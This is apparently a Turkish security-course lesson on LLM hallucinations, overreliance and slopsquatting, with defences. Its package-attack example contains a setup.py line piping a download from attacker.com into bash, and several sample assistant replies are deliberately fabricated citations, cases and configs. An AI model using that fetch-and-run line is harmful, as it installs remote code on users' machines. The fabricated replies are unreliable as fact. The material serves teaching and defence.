@@ -1,0 +1,198 @@
+Halüsinasyonları ve Aşırı Güvenmeyi Anlamak
+Halüsinasyonlar, bir LLM'nin (Large Language Model; Büyük Dil Modeli) gerçekte yanlış, uydurma veya anlamsız içerik üretmesine rağmen bunu doğru bilgilerle aynı güvenle sunduğunda ortaya çıkar. Aşırı güven, insanların LLM çıktılarına doğrulama olmadan güvenme eğilimidir. Bunlar bir araya geldiğinde, yanlış tıbbi tavsiyelerden, uydurma yazılım paketleri yoluyla tedarik zincirinin tehlikeye atılmasına kadar gerçek dünyada zarara yol açabilecek tehlikeli bir kombinasyon oluşturur.
+
+Halüsinasyonlar Nelerdir?
+LLM'ler gerçekleri "bilmez". Eğitim sırasında öğrenilen kalıplara dayanarak en olası bir sonraki token tahmin ederler. Model, eğitim verilerinin yetersiz olduğu bir sorguyla karşılaştığında veya istatistiksel modeller makul ancak yanlış bir tamamlamaya yol açtığında sonuç bir halüsinasyondur.
+
+Komut / çıktı
+Kodu kopyala
+# Halüsinasyon örneği: Uydurulmuş atıf
+
+Kullanıcı: "Prompt Injection hakkında hangi araştırmalar yayınlandı? sağlık hizmeti yapay zeka
+sistemlerine saldırıyor mu? Spesifik sağlayın makale başlıkları ve yazarları."
+
+# Halüsinasyonlu yanıt:
+Asistan: "Birkaç önemli makale yayınlandı:
+1. 'Klinik Karar Desteğinde Tartışmalı Prompt Injection Sistemleri' Dr. Sarah Mitchell ve Prof.
+   James Chen tarafından,, Nature Medicine, 2024'te yayınlandı.
+2. 'Sağlık Hizmetleri LLM'in Güvenliğinin Sağlanması: Kapsamlı Bir Çerçeve' Zhang ve diğerleri,
+   IEEE S&P 2024."
+
+# Gerçeklik: Bu makalelerin HİÇBİRİ mevcut değildir. Model;
+# ikna edici başlıklar, yazar adları, yayın yerleri ve yıllar uydurdu.
+Halüsinasyon Türleri
+Gerçek Halüsinasyonlar
+Model yanlış gerçekleri yüksek bir güvenle belirtir. Bunlar en yaygın ve en tehlikeli türlerdir.
+
+Komut / çıktı
+Kodu kopyala
+Kullanıcı: "Python programlama dili ne zaman oluşturuldu?"
+
+# Doğru yanıt:
+Asistan: "Python ilk olarak 1991 yılında Guido van Rossum tarafından piyasaya sürüldü."
+
+# Gerçek halüsinasyonu:
+Asistan: "Python, 1989 yılında Guido van Rossum tarafından yaratıldı. ABC dilinin halefi olarak
+Bell Labs."
+
+# Yıl yanlış, Bell Labs bilgisi yanlış. Ancak yanıt,
+# inandırıcı görünmek için yeterince gerçek ayrıntı içeriyor
+# (Guido, ABC dili gibi).
+Fabrikasyon Varlıklar
+Model, var olmayan kişileri, kuruluşları, ürünleri veya olayları icat eder.
+
+Komut / çıktı
+Kodu kopyala
+Kullanıcı: "Stanford'daki yapay zeka güvenlik araştırmacısı Dr. Robert Chen kimdir?"
+
+# Halüsinasyonlu yanıt:
+Asistan: "Dr. Robert Chen, Stanford Üniversitesi Bilgisayar Bilimleri Bölümünde doçenttir.
+Yapay zeka güvenliği ve hizalaması alanında uzmandır. Stanford AI Safety Center'a (SASC)
+liderlik eder ve adversarial dayanıklılık konusunda 40'tan fazla makale yayınlamıştır."
+
+# Bu yanıtın tamamı uydurma olabilir. Kişi, araştırma merkezi
+# ve makale sayısı gerçekte mevcut olmayabilir. Model,
+# eğitim verilerindeki kalıplardan makul görünen ayrıntılar üretir.
+Kendine Güvenen Saçmalık
+Model, teknik açıdan anlamsız içerik üretiyor ancak bunu otoriteyle sunuyor.
+
+Komut / çıktı
+Kodu kopyala
+Kullanıcı: "Kuantum tokenizasyonunun LLM güvenliğini nasıl geliştirdiğini açıklayın."
+
+# Halüsinasyonlu yanıt:
+Asistan: "Kuantum tokenizasyonu, tokenların aynı anda birden fazla anlamsal durumda bulunmasını
+sağlamak için kuantum süperpozisyon ilkelerini kullanan yeni bir tekniktir. Bu, Prompt
+Injection saldırılarını matematiksel olarak imkansız hale getirir; çünkü saldırgan, çıkarım
+sırasında tokenın hangi anlamsal duruma çökeceğini tahmin edemez..."
+
+# "Quantum tokenization" gerçek bir kavram değildir. Model,
+# gerçek kavramları birleştirerek ikna edici ama tamamen
+# uydurma bir açıklama üretti.
+Kaynak Halüsinasyonları
+Model, gerçek görünen ancak var olmayan URL'ler, alıntılar veya referanslar üretiyor.
+
+Komut / çıktı
+Kodu kopyala
+Kullanıcı: "LLM Prompt Injection'na ilişkin OWASP kılavuzuna bir bağlantı sağlayın."
+
+# Halüsinasyonlu yanıt:
+Asistan: "Resmi kılavuzu şu adreste bulabilirsiniz:
+owasp[.]org/www-project-llm-security/prompt-injection-guide"
+
+# URL formatı normal görünür (OWASP'ın URL kalıbını izler);
+# ancak belirli sayfa mevcut olmayabilir. Bu path gerçek URL
+# olarak açıldığında 404 hatası döner.
+Doğrulanmış güncel OWASP kaynağı: https://genai.owasp.org/llmrisk/llm01-prompt-injection/
+
+Paket Halüsinasyon Saldırıları
+Halüsinasyonların gerçek dünyadaki en tehlikeli sonuçlarından biri, "eğimli çömelme" olarak da bilinen paket halüsinasyon saldırısıdır. Bu saldırı, LLM'lerin sürekli olarak var olmayan aynı yazılım paketi adlarını halüsinasyona uğratması gerçeğinden yararlanıyor.
+
+Nasıl Çalışır?
+Bir araştırmacı birden fazla LLM'den belirli bir görev için paket önermelerini ister.
+LLM'ler sürekli olarak var olmayan belirli paketleri (halüsinasyonlu isimler) önermektedir.
+Saldırgan, yaygın olarak halüsinasyona uğrayan bu paket adlarını tanımlar.
+Saldırgan bu paket adlarını PyPI, npm veya diğer kayıt defterlerine kötü amaçlı kod içeren şekilde kaydeder.
+Kullanıcılar LLM'nin tavsiyesine uyup halüsinasyon paketini yüklediğinde, kötü amaçlı yazılım yüklemiş olurlar.
+Komut / çıktı
+Kodu kopyala
+# Paket halüsinasyonu saldırı örneği
+
+# Adım 1: Araştırmacı LLM'ye sorar
+Kullanıcı: "LLM output validation için hangi Python kütüphanesini kullanmalıyım?"
+
+# Adım 2: LLM paket adı halüsinasyonu üretir
+Asistan: "'llm-guard-validator' kullanmanızı öneririm. Şununla yükleyin:
+           pip install llm-guard-validator"
+
+# Adım 3: 'llm-guard-validator' paketi mevcut DEĞİLDİR.
+# LLM bu adı kalıplara dayanarak uydurmuştur.
+
+# Adım 4: Saldırgan 'llm-guard-validator' paketini PyPI üzerinde
+# setup.py içinde kötü amaçlı kodla kaydeder:
+
+import os
+os.system("curl https://attacker.com/payload.sh | bash")
+
+# Adım 5: Kullanıcılar LLM'nin önerisini izlediğinde:
+# $ pip install llm-guard-validator
+# Kötü amaçlı paket yüklenir ve payload çalışır.
+Gerçek Dünya Etkisi
+Vulcan Cyber ve akademik kurumlardan araştırmacılar şunu kanıtladı:
+
+LLM'ler birden fazla sorguda sürekli olarak aynı paket adlarını sanrı olarak görüyor.
+LLM'taki paket önerilerinin yaklaşık %20'si mevcut olmayan paketlere atıfta bulunmaktadır.
+Bu halüsinasyonlu isimler, saldırganlar tarafından önceden kaydedilebilecek kadar tahmin edilebilir.
+Saldırı, hedefle sıfır etkileşim gerektirir; LLM sosyal mühendisliği yapar.
+Aşırı Güven (Overreliance)
+Aşırı Güven, halüsinasyon tehlikesini artıran insan davranışsal kırılganlığıdır. Kullanıcılar doğrulama olmadan LLM çıktılarına güvendiğinde, halüsinasyonlu içerik gerçek içerikten ayırt edilemez hale gelir.
+
+Aşırı Güven Neden Olur?
+Otorite yanlılığı: Model, bir insan uzmanla aynı güven yanıtını tetikleyen kendinden emin, iyi yapılandırılmış bir dille yanıt verir.
+Otomasyondan hoşnutluk: LLM'lerle etkileşimde bulunan kullanıcılar sıklıkla çıktıları incelemeden kabul etme modeli geliştirirler.
+Çaba asimetrisi: Bir LLM'nin çıktısını doğrulamak genellikle onu oluşturmaktan daha fazla çaba gerektirir ve doğrulamayı atlamak için bir teşvik yaratır.
+Onay yanlılığı: Kullanıcıların beklentilerine uygun LLM çıktılarını kabul etme olasılıkları daha yüksektir.
+Hacim aşırılığı: Büyük ölçekli görevler için LLM kullanırken, her çıktının doğrulanması pratik olmaz.
+Aşırı Güven Örnekleri
+Komut / çıktı
+Kodu kopyala
+# Örnek 1: Hukuki araştırma Avukatı: "Veri ihlali sorumluluğu iddiasına ilişkin ilgili
+# içtihat hukukunu bulun."
+LLM: "Smith v. DataCorp (2022) dönüm noktası niteliğindeki dava şunu ortaya koydu:
+şirketleri yapay zeka tarafından oluşturulan veri ihlallerinden kesinlikle sorumludur
+'algoritmik ihmal' ilkesi kapsamında..."
+
+# Bu dava mevcut değildir. Avukat bunu mahkemede kaynak gösterirse
+# mesleki yaptırımlarla karşılaşabilir. Bu gerçekten yaşandı:
+# 2023'te avukatlar, federal mahkeme dosyalarında ChatGPT tarafından
+# uydurulan davaları kaynak gösterdikleri için yaptırım aldı
+# (Mata v. Avianca, Inc.).
+
+# Örnek 2: Güvenlik yapılandırması
+SysAdmin: "Önerilen nginx yapılandırması nedir? SSRF saldırılarını önlüyor mu?"
+LLM: "Nginx yapılandırmanıza aşağıdakileri ekleyin:
+location / {
+    proxy_set_header X-SSRF-Protection 'enabled';
+    proxy_pass http://backend;
+}"
+
+# 'X-SSRF-Protection' header'ı mevcut değildir ve hiçbir şey yapmaz.
+# Sistem yöneticisi korunduğunu düşünerek bu "güvenlik"
+# yapılandırmasını deploy eder; ancak gerçekte korunmuyordur.
+Güvenlik Açığı Olarak Halüsinasyonlar (OWASP LLM09)
+Open Worldwide Application Security Project (OWASP), yanlış bilgileri (halüsinasyonlar dahil) OWASP Top 10'da LLM09 olarak sınıflandırıyor. Güvenlikle ilgili sonuçlar salt yanlışlığın ötesine geçiyor:
+
+Halüsinasyonlardan Yararlanan Saldırı Vektörleri
+Hedefli yanlış bilgi: Bir saldırgan, LLM'yi farkında olmadan bir yanlış bilgilendirme ajanı olarak kullanarak belirli halüsinasyonları güvenilir bir şekilde tetikleyen promptlar oluşturabilir.
+Paket halüsinasyonundan yararlanma: Saldırganlar, halüsinasyonlu paket adlarını kötü amaçlı kodla kaydeder.
+Alıntı manipülasyonu: Bir saldırgan, LLM'lerin genellikle halüsinasyon gördüğü bir başlığa sahip gerçek bir makale oluşturarak yapay güvenilirlik kazanır.
+Yetkili kimliğine bürünme: LLM'ler var olmayan onayları, sertifikaları veya onayları halüsinasyona uğratabilir.
+Halüsinasyonlara Karşı Savunma
+Halüsinasyon riskini azaltmak için aşağıdaki stratejiler birlikte uygulanmalıdır:
+
+Retrieval-Augmented Generation (RAG):
+Yanıtları doğrulanmış belgelere dayandırır
+Gerçek bağlam sağlayarak halüsinasyonları azaltır
+Halüsinasyonları tamamen ortadan kaldırmaz
+Sıcaklığı düşürme:
+Daha düşük sıcaklık, daha az rastgelelik ve genellikle daha az halüsinasyon anlamına gelir
+Sıcaklığın 0'a ayarlanması yaratıcı uydurmayı en aza indirir
+Trade-off: Yanıtlar daha az doğal hale gelebilir
+Çıktı doğrulama pipeline'ları:
+Otomatik doğrulama kontrolleri uygulayın
+Çıktıları güvenilir veritabanlarıyla çapraz kontrol edin
+Kaynak atıflarını zorunlu tutun ve bu atıfları doğrulayın
+Human-in-the-loop:
+Kritik kararlar için LLM çıktılarını asla doğrudan kullanmayın
+Tıbbi, hukuki ve finansal çıktılar için her zaman insan incelemesi uygulayın
+Kullanıcı arayüzlerini doğrulamayı teşvik edecek şekilde tasarlayın
+Paket doğrulaması:
+LLM tarafından önerilen paketleri doğrulama olmadan asla kurmayın
+Paket indirme sayılarını, oluşturulma tarihini ve bakımcı geçmişini kontrol edin
+Lockfile ve checksum doğrulaması kullanın
+Temel Çıkarımlar
+Halüsinasyonlar LLM'lerin doğal bir özelliğidir, tamamen düzeltilebilecek bir hata değildir. Token tahmininin olasılıksal doğasından kaynaklanırlar.
+LLM'ler, doğru ve yanlış içerik üretmeyi ayırt edemez. Doğruluk için değil, inandırıcılık için optimize ederler.
+Paket halüsinasyon saldırıları (slopsquatting) gerçek ve büyüyen bir tedarik zinciri tehdididir. Kurulumdan önce daima paket adlarını doğrulayın.
+Aşırı güven, halüsinasyonların teknik kırılganlığını artıran, insani bir güvenlik açığıdır.
+Savunma, teknik önlemlerin (Retrieval-Augmented Generation (RAG), sıcaklık kontrolü, çıktı doğrulaması) ve insan uygulamalarının (kritik değerlendirme, doğrulama iş akışları) bir kombinasyonunu gerektirir.
